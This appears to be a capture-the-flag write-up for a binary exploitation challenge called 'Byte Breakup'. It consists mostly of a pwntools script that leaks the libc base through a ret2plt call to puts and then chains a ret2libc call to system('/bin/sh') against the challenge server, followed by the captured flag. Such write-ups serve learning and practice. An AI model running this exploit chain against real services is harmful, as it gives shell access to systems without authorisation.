# Byte Breakup

## Analysis
We can exploit using a ret2plt to leak the libc base address, then we can utilise a ret2libc attack to get shell.

## Solution
```python
from pwn import *

elf = ELF("./vuln")
context.binary = elf
libc = ELF("./libc.so.6")

#p = elf.process()
p = remote("34.125.199.248", 6969)

p.readuntil(b"password: \n")

rop = ROP(elf)
rop.raw(b"A" * 40)
rop.rdi = elf.got["puts"]
rop.call(elf.plt["puts"])
rop.call(elf.sym["main"])
p.sendline(rop.chain())

p.readline()
p.readline()

leak = u64(p.read(6) + b"\x00\x00")
libc.address = leak - libc.sym["puts"]

p.readuntil(b"password: \n")

rop = ROP(libc)
rop.rdx = 0
rop.rsi = 0
rop.rdi = p64(next(libc.search(b"/bin/sh\x00")))
rop.raw(p64(rop.find_gadget(['ret']).address))
rop.call("system")
p.sendline(rop.chain())

p.clean()

p.interactive()
```

## Flag
```
OSCTF{b1t_byt3_8r3akup}
```
